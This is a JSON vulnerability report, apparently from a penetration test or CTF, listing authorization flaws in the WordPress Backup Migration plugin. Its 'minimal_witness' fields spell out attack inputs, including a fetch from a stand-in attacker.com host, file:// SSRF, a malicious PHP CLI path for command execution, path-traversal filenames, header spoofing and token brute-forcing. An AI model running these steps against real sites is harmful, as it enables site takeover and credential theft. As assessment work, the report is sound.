
{
  "vulnerabilities": [
    {
      "ID": "AUTHZ-VULN-01",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=create-backup",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "Uses is_admin() instead of current_user_can('manage_options'). No additional capability check in prepareAndMakeBackup() at ajax.php:590",
      "side_effect": "Subscriber can create full site backup containing database dump, wp-config.php with credentials, and all files",
      "reason": "The is_admin() check only verifies request is in /wp-admin/ area, not that user has admin capabilities. Any authenticated user can trigger backup creation.",
      "minimal_witness": "Authenticate as Subscriber, obtain nonce from /wp-admin/ page, POST to endpoint with action=backup_migration&token=bmi&f=create-backup&nonce=[valid]",
      "confidence": "high",
      "notes": "Side effect includes full database export, wp-config.php exposure, and file enumeration. Backup becomes downloadable via AUTHZ-VULN-12."
    },
    {
      "ID": "AUTHZ-VULN-02",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=restore-backup",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "Uses is_admin() at line 297. No additional check in restoreBackup() at ajax.php:1075. Function immediately begins restore without capability validation.",
      "side_effect": "Subscriber can restore malicious backup, overwriting entire site including wp_users table. Can inject new admin account or replace existing admin passwords for complete site takeover.",
      "reason": "Restore function has no capability guard beyond the broken is_admin() check. Accepts arbitrary backup file parameter for restoration.",
      "minimal_witness": "Upload malicious backup via f=upload-backup, then call f=restore-backup with file=[malicious-backup.zip]. Backup can contain modified wp_users table with attacker-controlled admin account.",
      "confidence": "high",
      "notes": "CRITICAL - Highest impact vulnerability. Allows complete site takeover. Attacker can craft backup with known admin credentials."
    },
    {
      "ID": "AUTHZ-VULN-03",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=save-storage",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No additional capability check in saveStorageConfig() at ajax.php:1721. Function accepts user-supplied directory parameter at line 1722 and creates directory via mkdir() at line 1732.",
      "side_effect": "Subscriber can modify backup storage path to arbitrary directory, potentially exposing backups outside web root protection or redirecting to attacker-controlled location.",
      "reason": "Storage configuration accepts arbitrary directory paths without capability validation or path restriction.",
      "minimal_witness": "POST with f=save-storage&directory=/tmp/exposed-backups. Future backups written to attacker-specified location.",
      "confidence": "high",
      "notes": "Enables persistent access to backup data. Combined with AUTHZ-VULN-12, allows exfiltration of all future backups."
    },
    {
      "ID": "AUTHZ-VULN-04",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=save-other-options",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in saveOtherOptions() at ajax.php:1846. Function accepts php_cli_manual_path parameter at line 1867 with only trim() sanitization, no validation.",
      "side_effect": "Subscriber can set PHP CLI path to attacker-controlled script. When backup/restore operations execute, malicious script runs with web server privileges, enabling RCE.",
      "reason": "PHP CLI path configuration lacks validation and capability checks. Attacker can point to malicious executable.",
      "minimal_witness": "POST f=save-other-options&php_cli_manual_path=/tmp/evil.sh, then trigger f=create-backup. The evil.sh script executes during backup.",
      "confidence": "high",
      "notes": "Two-step exploitation: (1) set malicious CLI path, (2) trigger any backup operation. Leads to command execution."
    },
    {
      "ID": "AUTHZ-VULN-05",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=download-backup",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in handleQuickMigration() at ajax.php:1498. Function accepts url parameter and passes directly to exec() at line 1513 without validation.",
      "side_effect": "Subscriber can trigger SSRF to arbitrary URLs including file:// protocol. Combined with command injection vulnerability, enables reading /opt/flag.txt or executing arbitrary commands.",
      "reason": "Quick migration function lacks capability checks and input validation on URL parameter.",
      "minimal_witness": "POST f=download-backup&url=file:///opt/flag.txt or url=http://attacker.com/malicious.zip",
      "confidence": "high",
      "notes": "CRITICAL - Direct path to CTF flag via SSRF. Also enables command injection for RCE."
    },
    {
      "ID": "AUTHZ-VULN-06",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=staging-local-creation-process",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in localStagingCreationProcess() at ajax.php:3463. Function performs database duplication and file copying without privilege validation.",
      "side_effect": "Subscriber can create staging sites, accessing complete database copy and file system. Staging includes all user data, credentials, and configuration.",
      "reason": "Staging creation is intensive operation requiring admin privileges, but only protected by broken is_admin() check.",
      "minimal_witness": "POST f=staging-start-local-creation to initiate, then f=staging-local-creation-process to create staging site.",
      "confidence": "high",
      "notes": "Enables data exfiltration via staging site with separate URL. Consumes significant server resources."
    },
    {
      "ID": "AUTHZ-VULN-07",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=staging-delete-permanently",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in stagingDelete() at ajax.php:3463 calling controller.php:400 delete(). Function accepts arbitrary staging name without ownership validation.",
      "side_effect": "Subscriber can delete ANY staging site created by ANY user. Causes data loss and disrupts legitimate admin workflows.",
      "reason": "Staging deletion lacks both capability checks and ownership validation. Accepts user-supplied staging name.",
      "minimal_witness": "POST f=staging-delete-permanently&name=[staging-site-name]. Deletes staging files and database tables.",
      "confidence": "high",
      "notes": "Destructive IDOR - combines vertical escalation with horizontal authorization bypass. DoS impact."
    },
    {
      "ID": "AUTHZ-VULN-08",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=reset-configuration",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in resetConfiguration() at ajax.php:2623. Function deletes BMI_CONFIG_PATH and removes WordPress options without validation.",
      "side_effect": "Subscriber can wipe all plugin configuration, disrupting backups site-wide. Essentially a 'factory reset' accessible to low-privilege users.",
      "reason": "Configuration reset is destructive admin operation protected only by broken is_admin() check.",
      "minimal_witness": "POST f=reset-configuration. Plugin config deleted, backup operations disrupted until reconfigured.",
      "confidence": "high",
      "notes": "Denial of service impact. Legitimate backups fail until admin reconfigures plugin."
    },
    {
      "ID": "AUTHZ-VULN-09",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=get-site-data",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in getSiteData() at ajax.php:2642. Function returns comprehensive system information without privilege validation.",
      "side_effect": "Subscriber can enumerate PHP version, server paths, installed extensions, database details, and file system structure for reconnaissance.",
      "reason": "Site data endpoint exposes sensitive system information to all authenticated users.",
      "minimal_witness": "POST f=get-site-data. Returns JSON with server configuration details.",
      "confidence": "high",
      "notes": "Information disclosure enables targeted attacks. Reveals server architecture and potential vulnerabilities."
    },
    {
      "ID": "AUTHZ-VULN-10",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=unlock-backup",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in toggleBackupLock(true) at ajax.php:2570. Function accepts filename parameter without ownership validation.",
      "side_effect": "Subscriber can unlock ANY backup operation including those initiated by other users. Enables workflow bypass.",
      "reason": "Lock/unlock functions lack both capability and ownership checks. Backup lock state is global, not per-user.",
      "minimal_witness": "POST f=unlock-backup&filename=[backup-name.zip]. Unlocks backup for manipulation.",
      "confidence": "high",
      "notes": "Workflow manipulation vulnerability. Combined with other vulnerabilities, enables tampering with active backup processes."
    },
    {
      "ID": "AUTHZ-VULN-11",
      "vulnerability_type": "Vertical",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=get-current-backups",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:297",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No capability check in getBackupsList() at ajax.php:1039 calling scanner/backups.php:139. Function returns ALL backups without user filtering.",
      "side_effect": "Subscriber can enumerate ALL backup files including filenames, sizes, creation dates created by ALL users. Enables targeted IDOR attacks.",
      "reason": "Backup listing has no per-user filtering. All backups visible to all authenticated users.",
      "minimal_witness": "POST f=get-current-backups. Returns JSON array with all backup metadata.",
      "confidence": "high",
      "notes": "Information disclosure + IDOR enabler. Provides target list for AUTHZ-VULN-12 (download) and AUTHZ-VULN-13 (delete)."
    },
    {
      "ID": "AUTHZ-VULN-12",
      "vulnerability_type": "Horizontal",
      "externally_exploitable": true,
      "endpoint": "GET /?backup-migration=BMI_BACKUP&backup-id=[filename]",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1049",
      "role_context": "administrator (any admin can access any admin's backup)",
      "guard_evidence": "Authorization check at line 1049: bmi_get_config('STORAGE::DIRECT::URL') === 'true' || current_user_can('administrator'). No ownership validation. Manifest stores uid at zip.php:77 but never validated during download.",
      "side_effect": "Admin User A can download Admin User B's backup file containing complete database dump, wp-config.php with credentials, and all site files. If STORAGE::DIRECT::URL is 'true' (default), even unauthenticated users can download.",
      "reason": "Backup download checks admin role but NOT backup ownership. No user_id comparison against manifest uid field.",
      "minimal_witness": "As Admin User A: GET /?backup-migration=BMI_BACKUP&backup-id=[UserB-backup.zip]. Downloads User B's backup without ownership check. If config bypass active (AUTHZ-VULN-16), no authentication required.",
      "confidence": "high",
      "notes": "CRITICAL horizontal IDOR. Default config STORAGE::DIRECT::URL='true' makes this unauthenticated. Backup contains database credentials and WordPress secret keys."
    },
    {
      "ID": "AUTHZ-VULN-13",
      "vulnerability_type": "Horizontal",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=delete-backup",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:1672",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No ownership check in removeBackupFile() at ajax.php:1640. Function accepts filenames array and deletes files at line 1680 without validating creator. Path traversal protection at line 1672 is weak regex: preg_replace('/\\.\\./', '', $file)",
      "side_effect": "User A can delete User B's backup files. Permanent data loss. Weak path traversal regex allows bypasses like '../../../' → '///' or '..././' → './'.",
      "reason": "Backup deletion has no ownership validation. Backups lack creator tracking beyond manifest uid which is never checked.",
      "minimal_witness": "As User A: POST f=delete-backup&filenames[]=[UserB-backup.zip]. Deletes User B's backup. Path traversal: filenames[]=..././..././sensitive-backup.zip",
      "confidence": "high",
      "notes": "Destructive horizontal IDOR. Combined with vertical escalation (AUTHZ-VULN-01), Subscriber can delete ANY backup. Weak regex enables limited path traversal."
    },
    {
      "ID": "AUTHZ-VULN-14",
      "vulnerability_type": "Horizontal",
      "externally_exploitable": true,
      "endpoint": "POST /wp-admin/admin-ajax.php?action=backup_migration&f=staging-prepare-login",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/ajax.php:3373",
      "role_context": "subscriber (any authenticated user)",
      "guard_evidence": "No ownership check in stagingPrepareLogin() at ajax.php:3373 calling controller.php:298 prepareLogin(). Function extracts login_user_id + password from staging config at line 304-305 without validating current user matches login_user_id.",
      "side_effect": "User A can generate passwordless auto-login URL for User B's staging site. Returns URL format: wp-login.php?autologin=true&user={user_id}&secret={password}. Enables account hijacking.",
      "reason": "Staging login preparation accepts arbitrary staging name parameter without ownership validation. Auto-login URL grants access to staging admin account.",
      "minimal_witness": "As User A: POST f=staging-prepare-login&name=[UserB-staging-site]. Returns auto-login URL for User B's staging admin account.",
      "confidence": "high",
      "notes": "CRITICAL horizontal privilege escalation. Enables cross-user account takeover via staging sites. Auto-login URL contains user ID and password hash."
    },
    {
      "ID": "AUTHZ-VULN-15",
      "vulnerability_type": "Context_Workflow",
      "externally_exploitable": true,
      "endpoint": "GET /?backup-migration=AFTER_RESTORE&backup-id=[timestamp]&progress-id=4u70L051n",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:996-1046",
      "role_context": "unauthenticated (no authentication required)",
      "guard_evidence": "Token validation at lines 1009-1018 checks: (1) timestamp within ±6 seconds, (2) IP matches stored IP, (3) progress-id === '4u70L051n'. Token generation at ajax.php:1097 uses predictable format: time() . '_' . $ip . '_' . '4u70L051n'. NO cryptographic randomness.",
      "side_effect": "Attacker can brute-force admin login within 6-second window after restore. Token uses predictable Unix timestamp, spoofable IP headers (HTTP_CLIENT_IP, HTTP_X_FORWARDED_FOR), and static suffix. Logs in as first administrator (User ID 1) without password at line 1027.",
      "reason": "Auto-login token lacks cryptographic security. Timestamp is guessable, IP is spoofable via headers, suffix is static string. 6-second window sufficient for brute force.",
      "minimal_witness": "Detect restore operation (timing attack or monitoring). For each timestamp in ±6 second range: GET /?backup-migration=AFTER_RESTORE&backup-id=[T]&progress-id=4u70L051n with headers X-Forwarded-For: 127.0.0.1. On success, redirected to /wp-admin/ as administrator.",
      "confidence": "high",
      "notes": "CRITICAL authentication bypass. Race condition exploitation. Requires precise timing but 6-second window is sufficient. Grants full admin access without credentials."
    },
    {
      "ID": "AUTHZ-VULN-16",
      "vulnerability_type": "Context_Workflow",
      "externally_exploitable": true,
      "endpoint": "GET /?backup-migration=BMI_BACKUP&backup-id=[filename]",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1049",
      "role_context": "unauthenticated (if config modified)",
      "guard_evidence": "Authorization check: Dashboard\\bmi_get_config('STORAGE::DIRECT::URL') === 'true' || current_user_can('administrator'). Default config at htaccess/default.json:2 sets STORAGE::DIRECT::URL: 'true'. When true, bypasses ALL authentication.",
      "side_effect": "If STORAGE::DIRECT::URL config is 'true' (default in plugin), ANY user including unauthenticated can download ALL backups. When OTHER:DOWNLOAD:DIRECT is also true, plugin deletes .htaccess protection at lines 1055-1056 and redirects to direct file URL.",
      "reason": "Configuration-based authentication bypass. Default plugin settings enable unauthenticated backup downloads. Attacker who gains config modification (via AUTHZ-VULN-08) can enable this permanently.",
      "minimal_witness": "Check if config enabled: GET /?backup-migration=BMI_BACKUP&backup-id=[known-backup.zip]. If STORAGE::DIRECT::URL='true', backup downloads without authentication. To enable: use AUTHZ-VULN-08 or AUTHZ-VULN-02 to modify config, then exploit.",
      "confidence": "medium",
      "notes": "Configuration-dependent bypass. Default settings may enable this. Combined with AUTHZ-VULN-02 (restore malicious backup with modified config) or AUTHZ-VULN-08 (reset to defaults), becomes persistent backdoor."
    },
    {
      "ID": "AUTHZ-VULN-17",
      "vulnerability_type": "Context_Workflow",
      "externally_exploitable": true,
      "endpoint": "GET /?backup-migration=PROGRESS_LOGS&backup-id=[type]&progress-id=[logfile]",
      "vulnerable_code_location": "/wordpress/wp-content/plugins/backup-backup/includes/initializer.php:1194,1215,1236,1258",
      "role_context": "unauthenticated (time-based bypass)",
      "guard_evidence": "Authorization at multiple locations: ((time() - filemtime($progress)) < (60 * 5)) || current_user_can('administrator'). Access granted if file modified within last 5 minutes OR user is admin. NO authentication required during 5-minute window.",
      "side_effect": "During backup/restore operations, progress logs accessible to unauthenticated users for 5 minutes after file modification. Logs contain database structure, file paths, PHP paths, error messages, and system information.",
      "reason": "Time-based authorization bypass. File modification time determines access, not user permissions. Race condition: trigger operation, immediately access logs.",
      "minimal_witness": "Trigger backup via AUTHZ-VULN-01 or wait for scheduled backup. Within 5 minutes: GET /?backup-migration=PROGRESS_LOGS&backup-id=latest_full&progress-id=latest_full.log or progress-id=latest_migration.log. No authentication required if file < 5 min old.",
      "confidence": "high",
      "notes": "Information disclosure via time-based bypass. Logs reveal database table names, file system paths, plugin configuration, and error details. 5-minute window sufficient for exploitation."
    }
  ]
}